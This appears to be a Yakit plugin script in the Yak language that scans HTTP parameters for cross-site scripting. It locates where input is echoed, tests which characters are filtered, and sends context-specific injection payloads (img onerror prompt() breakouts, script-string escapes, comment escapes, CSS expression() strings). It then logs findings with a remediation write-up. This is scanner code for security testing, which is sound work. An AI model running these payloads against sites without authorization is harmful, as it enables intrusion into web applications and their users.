debug = true
origin_yakit_output = yakit_output

yakit_output = 1
if debug {
    log.setLevel("debug")
    yakit_output = func(v...) {println(v...)}
} else {
    log.setLevel("info")
    yakit_output = origin_yakit_output
}


/*
value: payload
dangerousChars: Some may be filtered/Escaped dangerous characters
payloadType: payload type,
    1. (tag) text within the tag: Construct tag closure
    2. (attr) attribute: construct tag Closed or pseudo-protocol, if it is (spec-attr) special attribute can use javascript code directly
    3. (comment) Comment: Construct tag closure
    4. (js) script tag: construct tag closed or dom type
*/
newPayload = func(value, dangerousChars, payloadType) {
    return {"value": value, "dangerousChars": dangerousChars, "payloadType": payloadType }
}

/*
maybeVuln: The vulnerability may exist (that is, it may be a false positive)
url: Vulnerable url
param: vulnerability point parameter
payload: Refer to newPayload
*/
newResult = func(maybeVuln, url, param, payload, reqRaw, respRaw) {
    return {"maybeVuln": maybeVuln, "url": url, "param": param, "payload": payload, "reqRaw": reqRaw, "respRaw": respRaw }
}

// Filter some special params
filterParams = func(params) {
    newParams = make([]var)
    for _, param = range params {
        // filters the submit parameters in the post.
        if str.MatchAllOfRegexp(param.Name(), `^(?i)submit$`) && str.HasPrefix(param.PositionVerbose(), "POST") {
            continue   
        }
        newParams = append(newParams, param)
    }
    return newParams

}

// Special tag judgment
specialAttr = func(attrName) {
    attrName = str.ToUpper(attrName)
    return attrName == "ONAFTERPRINT" || attrName == "ONBEFOREPRINT" || attrName == "ONBEFOREONLOAD" || attrName == "ONBLUR" || attrName == "ONERROR" || attrName == "ONFOCUS" || attrName == "ONHASCHANGE" || attrName == "ONLOAD" || attrName == "ONMESSAGE" || attrName == "ONOFFLINE" || attrName == "ONONLINE" || attrName == "ONPAGEHIDE" || attrName == "ONPAGESHOW" || attrName == "ONPOPSTATE" || attrName == "ONREDO" || attrName == "ONRESIZE" || attrName == "ONSTORAGE" || attrName == "ONUNDO" || attrName == "ONUNLOAD" || attrName == "ONBLUR" || attrName == "ONCHANGE" || attrName == "ONCONTEXTMENU" || attrName == "ONFOCUS" || attrName == "ONFORMCHANGE" || attrName == "ONFORMINPUT" || attrName == "ONINPUT" || attrName == "ONINVALID" || attrName == "ONRESET" || attrName == "ONSELECT" || attrName == "ONSUBMIT" || attrName == "ONKEYDOWN" || attrName == "ONKEYPRESS" || attrName == "ONKEYUP" || attrName == "ONCLICK" || attrName == "ONDBLCLICK" || attrName == "ONDRAG" || attrName == "ONDRAGEND" || attrName == "ONDRAGENTER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGOVER" || attrName == "ONDRAGSTART" || attrName == "ONDROP" || attrName == "ONMOUSEDOWN" || attrName == "ONMOUSEMOVE" || attrName == "ONMOUSEOUT" || attrName == "ONMOUSEOVER" || attrName == "ONMOUSEUP" || attrName == "ONMOUSEWHEEL" || attrName == "ONSCROLL" || attrName == "ONABORT" || attrName == "ONCANPLAY" || attrName == "ONCANPLAYTHROUGH" || attrName == "ONDURATIONCHANGE" || attrName == "ONEMPTIED" || attrName == "ONENDED" || attrName == "ONERROR" || attrName == "ONLOADEDDATA" || attrName == "ONLOADEDMETADATA" || attrName == "ONLOADSTART" || attrName == "ONPAUSE" || attrName == "ONPLAY" || attrName == "ONPLAYING" || attrName == "ONPROGRESS" || attrName == "ONRATECHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONSEEKED" || attrName == "ONSEEKING" || attrName == "ONSTALLED" || attrName == "ONSUSPEND" || attrName == "ONTIMEUPDATE" || attrName == "ONVOLUMECHANGE" || attrName == "ONWAITING" || attrName == "ONTOUCHSTART" || attrName == "ONTOUCHMOVE" || attrName == "ONTOUCHEND" || attrName == "ONTOUCHENTER" || attrName == "ONTOUCHLEAVE" || attrName == "ONTOUCHCANCEL" ||  attrName == "ONGESTURESTART" || attrName == "ONGESTURECHANGE" || attrName == "ONGESTUREEND" || attrName == "ONPOINTERDOWN" || attrName == "ONPOINTERUP" || attrName == "ONPOINTERCANCEL" || attrName == "ONPOINTERMOVE" || attrName == "ONPOINTEROVER" || attrName == "ONPOINTEROUT" || attrName == "ONPOINTERENTER" || attrName == "ONPOINTERLEAVE" || attrName == "ONGOTPOINTERCAPTURE" || attrName == "ONLOSTPOINTERCAPTURE" || attrName == "ONCUT" || attrName == "ONCOPY" || attrName == "ONPASTE" || attrName == "ONBEFORECUT" || attrName == "ONBEFORECOPY" || attrName == "ONBEFOREPASTE" || attrName == "ONAFTERUPDATE" || attrName == "ONBEFOREUPDATE" || attrName == "ONCELLCHANGE" || attrName == "ONDATAAVAILABLE" || attrName == "ONDATASETCHANGED" || attrName == "ONDATASETCOMPLETE" || attrName == "ONERRORUPDATE" || attrName == "ONROWENTER" || attrName == "ONROWEXIT" || attrName == "ONROWSDELETE" || attrName == "ONROWINSERTED" || attrName == "ONCONTEXTMENU" || attrName == "ONDRAG" || attrName == "ONDRAGSTART" || attrName == "ONDRAGENTER" || attrName == "ONDRAGOVER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGEND" || attrName == "ONDROP" || attrName == "ONSELECTSTART" || attrName == "ONHELP" || attrName == "ONBEFOREUNLOAD" || attrName == "ONSTOP" || attrName == "ONBEFOREEDITFOCUS" || attrName == "ONSTART" || attrName == "ONFINISH" || attrName == "ONBOUNCE" || attrName == "ONBEFOREPRINT" || attrName == "ONAFTERPRINT" || attrName == "ONPROPERTYCHANGE" || attrName == "ONFILTERCHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONLOSECAPTURE" || attrName == "ONDRAGDROP" || attrName == "ONDRAGENTER" || attrName == "ONDRAGEXIT" || attrName == "ONDRAGGESTURE" || attrName == "ONDRAGOVER" || attrName == "ONCLOSE" || attrName == "ONCOMMAND" || attrName == "ONINPUT" || attrName == "ONCONTEXTMENU" || attrName == "ONOVERFLOW" || attrName == "ONOVERFLOWCHANGED" || attrName == "ONUNDERFLOW" || attrName == "ONPOPUPHIDDEN" || attrName == "ONPOPUPHIDING" || attrName == "ONPOPUPSHOWING" || attrName == "ONPOPUPSHOWN" || attrName == "ONBROADCAST" || attrName == "ONCOMMANDUPDATE" || attrName == "STYLE"
}

// special tag payload
specialAttrPayload = func(attrName, verifyRandStr) {
    payload = ""

    if attrName == "STYLE" {
        payload = sprintf("xss: expression(prompt(`%s`))", verifyRandStr)
    } else {
        payload = sprintf("prompt(`%s`)", verifyRandStr)
    }

    return payload
}

// Check for errors and exit
checkErr = func(err) {
    if err != nil {
        yakit_output(sprintf("XSS-DETECT error: %s", err.Error()))
        os.Exit(1)
    }
}

description = `XSS is a common website security vulnerability, which allows attackers to inject malicious scripts into web page and then execute it on other users browsers. This attack occurs on the users browser side, and attackers can exploit this vulnerability to steal user information, such as cookies, session tokens, or other sensitive information.

XSS attacks can usually be classified into three types:
    1. Stored XSS: The malicious script submitted by the attacker is stored on the server. When other users request the page, the malicious script is sent to the users browser and executed.
    2. Reflected XSS: The malicious script is not stored on the server, but transmitted in the URL. When a user clicks on a malicious link or submits a form, the malicious script is sent to the users browser and executed.
    3. DOM Type XSS: The attacker uses the DOM script of the web page to cause the malicious script to be executed on the users browser. `

solution = `Input filtering: all user input should be considered untrustworthy. Proper handling is required. Before user input is inserted into an HTML page, it should be HTML escaped to convert special characters into corresponding HTML entities. For example, the string literal < is converted to <and set > is converted to > etc. .
Output encoding: When outputting data to an HTML page, a safe encoding method should be used, such as Use HTML entity encoding to handle all untrusted data.
Use HTTP-only Cookies: Mark sensitive cookies as HTTP-only so that JavaScript cannot read these cookies. This prevents attackers from stealing users cookies via XSS attacks.
Content Security Policy (CSP): CSP is a browser security mechanism that prevents XSS attacks by limiting where scripts in web pages come from and how they are executed. For example, you can set a CSP to only allow scripts from its own site to be executed, or to disable inline scripts.
. Update and maintain the system: keep the system, network and application security updated to prevent known security vulnerabilities were exploited.

The above is the basic description and repair plan of XSS vulnerabilities. It should be noted that repairing XSS vulnerabilities requires a comprehensive security strategy and continuous maintenance. The repair plans provided above are just part of it. `
// Final result log output
xssLog = func(result) {
    maybeVuln = result.maybeVuln
    url = result.url
    param = result.param 
    payload = result.payload
    reqRaw = result.reqRaw  
    respRaw = result.respRaw
    msg = "Found xss"

    if maybeVuln {
        msg = "Maybe xss"
    }
    payloadString := sprintf("%s=%s", param.Name(), payload.value)

    report = {"message": msg, "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}
    
    yakit_output(report)

    risk.NewRisk(
        url,
        risk.title(sprintf("XSS for: %v", url)),
        risk.titleVerbose(sprintf("Detected xss vulnerability: %v", url)),
        risk.details(report),
        risk.description(description),
        risk.solution(solution),
        risk.type("xss"),
        risk.payload(payloadString),
        risk.request(reqRaw), 
        risk.response(respRaw),
        risk.severity("warning"),
    )
    
}

// Store the payload of the parameters echoed in the page into the database
EchoLog = func(result) {
    url = result.url
    param = result.param 
    payload = result.payload
    reqRaw = result.reqRaw  
    respRaw = result.respRaw
    payloadString := sprintf("%s=%s", param.Name(), payload.value)
    report = {"message": "XSS echo", "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}

    risk.NewRisk(
        url,
        risk.title(sprintf("Echo for: %v %s: %s", url, param.PositionVerbose(), param.Name())),
        risk.details(report),
        risk.type("xss-echo"),
        risk.payload(payloadString),
        risk.request(reqRaw),
        risk.response(respRaw),
        risk.severity("low"),
        risk.description(description),
        risk.solution(solution),
    )
}


// fuzz in the script tag and return the original request and original response
Rawfuzz = func(param, fuzzPayload) {
    freq = param.Fuzz(fuzzPayload)
    httpReq, err = freq.GetFirstFuzzHTTPRequest()
    checkErr(err)
    rawReq, err = httpReq.GetOriginHTTPRequest()
    checkErr(err)
    reqBody, err = http.dump(rawReq)
    checkErr(err)
    reqBody = reqBody
    respChannel,err =  freq.Exec()
    checkErr(err)
    rsp = <-respChannel
    respBody, err = str.ExtractBodyFromHTTPResponseRaw(rsp.ResponseRaw)
    checkErr(err)

    return rsp.Response, reqBody, respBody
}


payloadFuzzTask = func(swg, resultCh, url, param, verifyRandStr, payload) {
    swg.Add()

    go func {
        defer swg.Done()

        rsp, reqBody, newBody = Rawfuzz(param, payload.value)

        // Client/server error Then
        if rsp.StatusCode >= 400 {
            return
        }

        existVuln = false
        maybeVuln = false
        extraMsg = ""
        payloadType = payload.payloadType

        if payloadType == "js" {
        verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) // js type payload to determine the existence of the vulnerability: js contains"verifyRandStr"parameters.
            for _, matchNode = range verifyMatchNodes {
                if matchNode.TagName != "script" {
                    continue
                }
                result,err = js.ASTWalk(matchNode.MatchText)
                if err != nil { // will not be verified. If ASTWalk reports an error, there may be an xss
                    existVuln = true
                    maybeVuln = true
                    break
                }


                for _,s = range result.StringLiteral{
                    if s == verifyRandStr {
                        existVuln = true
                        break
                    }
                }

                if len(result.BadSyntax) > 0 { // . If there is an error in js syntax, there may be xss
                    existVuln = true
                    maybeVuln = true
                    break
                }
            }
        } else {
            if payloadType == "comment" { // . Comment type payload determines the existence conditions of the vulnerability: escape the comment
                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
                for _, matchNode = range verifyMatchNodes {
                    if matchNode.IsText() && matchNode.MatchText == verifyRandStr {
                        existVuln = true
                        break
                    }
                }
            } elif str.HasPrefix(payloadType, "spec") { // ! No judgment is made on spec-attr type vulnerabilities, and there may be false positives
                existVuln = true
                maybeVuln = true
            } else { // tag or attr type Determine the conditions for the existence of the vulnerability: There is a node with the attribute value verifyRandStr , prove label escape or attribute escape
                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
                for _, matchNode = range verifyMatchNodes {
                    if matchNode.IsAttr() && matchNode.Key == "id" && matchNode.Val == verifyRandStr {
                        existVuln = true
                        break
                    }
                }
            }
        }

        if existVuln {
            contentType = ""
            try {
                contentType = rsp.Header["Content-Type"][0]
            } catch {
                contentType = ""
            }
            if contentType.Contains("html") { // The response type contains html
                result = newResult(maybeVuln, url, param, payload, reqBody, newBody)
                resultCh <- result
            }
        } else {
            // If it is judged that there is no vulnerability, Write the echoed location payload into the database to prevent false positives
            // EchoLog(newResult(false, url, param, payload, reqBody, newBody))
        }
    }
}

paramFuzzTask = func(threads, url, param) {
    // ! Determine the location of the parameter
    randStr = str.RandStr(5)
    verifyRandStr =  str.RandStr(8)

    _, reqBody, rawBody = Rawfuzz(param, randStr)

    // ! 2. Find the location of the random string
    matchNodes = xhtml.Find(rawBody, randStr)

    /*
        ! Three types are separated according to the node position
        1. (tag) text within the tag: Construct tag closure
        2. (attr) attribute: Construct tag closure or pseudo protocol. If it is a special attribute, you can directly use javascript code
        3. (comment) Comment: Construct tag closure
        4. (js) script tag: construct tag closed or dom type
    */
    payloads = []

    for _, matchNode = range matchNodes {

        if matchNode.IsText() {
            /*
            4.
            Example:<script>a = '<parameters>';</script>
            */
            if matchNode.TagName == "script" {
                // Quotation marks determine
                matchText = matchNode.MatchText
                randStrIndex = str.Index(matchNode.MatchText, randStr)
                quote = ""
                for {
                    randStrIndex -= 1
                    if randStrIndex < 0{
                        break
                    }
                    chr = matchText[randStrIndex]
                    if chr == '=' {
                        break
                    } elif chr == '"' {
                        quote = `"`
                        break
                    } elif chr == '\'' {
                        quote = `'`
                        break
                    } elif chr == '`' {
                        quote = "`"
                        break
                    }
                }

                payloads = append(payloads, newPayload(sprintf("1%s;prompt('%s');%s", quote, verifyRandStr, quote), ";"+quote, "js"))

                payloads = append(payloads, newPayload(sprintf("1%s;</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>%s", quote, xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), quote), "<>"+quote, "tag"))
            } else {
                /*
                1. Text in the tag: Construct a tag to close the payload of
                Example:<div><parameters></div>
                */
                payloads = append(payloads, newPayload(sprintf("</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName)), "<>", "tag"))
            }
        } elif matchNode.IsAttr() {
            /*
            2. Attribute: Construct tag closure or pseudo protocol. If it is a special attribute, you can directly use javascript code
            Example:<div id="<parameters>"></div> <img src=1 onerror="<parameters>"></div>
            */
            attrName = str.ToUpper(matchNode.Key)

            // Special attribute processing
            if specialAttr(attrName) {
                payload = specialAttrPayload(attrName, verifyRandStr)
                payloads = append(payloads, newPayload(payload, "", "spec-attr"))
            } else {
                payload = sprintf("\"></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=\"", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))

                payload = sprintf("'></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s='", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))

                payload = sprintf("></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
            }
        } elif matchNode.IsCOMMENT() {
            /*
            3. Note: Construct label closure
            Example:<!-- <parameters> -->
            */
            payloads = append(payloads, newPayload(sprintf("-->%s<%s>prompt(1);</%s><!--", verifyRandStr, xhtml.RandomUpperAndLower("script"), xhtml.RandomUpperAndLower("script")), "<>-", "comment"))
        }
    }
    log.debug(sprintf("[%d] payloads: %s", len(payloads), payloads))

    // ! 4. Detect dangerous characters and filter payload
    filterChars = []
    allDangerousChars = ["<", ">", "'", "\"", "/", "-"]
    i = 0

    detectPayload = randStr + str.Join(allDangerousChars, randStr) + randStr
    resp, err = param.Fuzz(detectPayload).Exec()
    checkErr(err)
    rspo = <-resp
    body, err = str.ExtractBodyFromHTTPResponseRaw(rspo.ResponseRaw)
    checkErr(err)
    randStrFromIndex = body

    for {
        n, btChr = xhtml.MatchBetween(randStrFromIndex, randStr, randStr, 50)
        if n == -1 || i >= len(allDangerousChars){
            break
        }

        if allDangerousChars[i] != btChr {
            pass = false
            filterChars = append(filterChars, string(allDangerousChars[i]))
        }
        randStrFromIndex = randStrFromIndex[n:]
        i += 1
    }
    log.debug(sprintf("[%d]filterChars: %s", len(filterChars), filterChars))

    // with quotes! 5. Determine the payload that can be used according to filterChars for Fuzz and find xss
    swg = sync.NewSizedWaitGroup(threads)
    resultCh = make(chan map[string]var, len(payloads))


    for _, payload = range payloads {
        isFilter = false

        for _, filterChar = range filterChars {
            if str.Contains(payload.dangerousChars, filterChar) {
                isFilter = true
            }
        }
        if isFilter {
            // is filtered, the echoed location payload will be written into the database to prevent false positives
            // EchoLog(newResult(false, url, param, payload, reqBody, rawBody))
            continue
        }
        log.debug(sprintf("Available payload: %s payloadType: %s dangerousChars: %s", payload.value, payload.payloadType, payload.dangerousChars))

        payloadFuzzTask(swg, resultCh, url, param, verifyRandStr, payload)
    }

    swg.Wait()
    close(resultCh)

    
    // ! Six output results
    saveDB = true 
    for result = range resultCh {
        if !saveDB {
            continue
        }
        xssLog(result)
        saveDB = false
    }
}



__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8990/xss/example4.php?name=hacker&v=hacker2")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorFilteredHTTPFlow(results...)
}


mirrorFilteredHTTPFlow = func(ishttps, url, req, rsp, body) {
    threads = 10
    pathDetect = true

    // Construct fuzz request
    freq, err = fuzz.HTTPRequest(req, fuzz.https(ishttps))
    checkErr(err)

    // Get parameters, including post json, post form, get parameters, cookie parameter path parameters (PHPSESSID, _ga, _gid and other parameters will be automatically filtered)
    params = freq.GetCommonParams()    

    if pathDetect {
        pathAppendParams = freq.GetPathAppendParams()
        params = append(params, pathAppendParams...)
        pathBlockParams = freq.GetPathBlockParams()
        params = append(params, pathBlockParams...)
    }
    
    params = filterParams(params)
    

    // . Traverse all params to fuzz
    for _, param = range params {
        paramFuzzTask(threads, url, param)
    }

}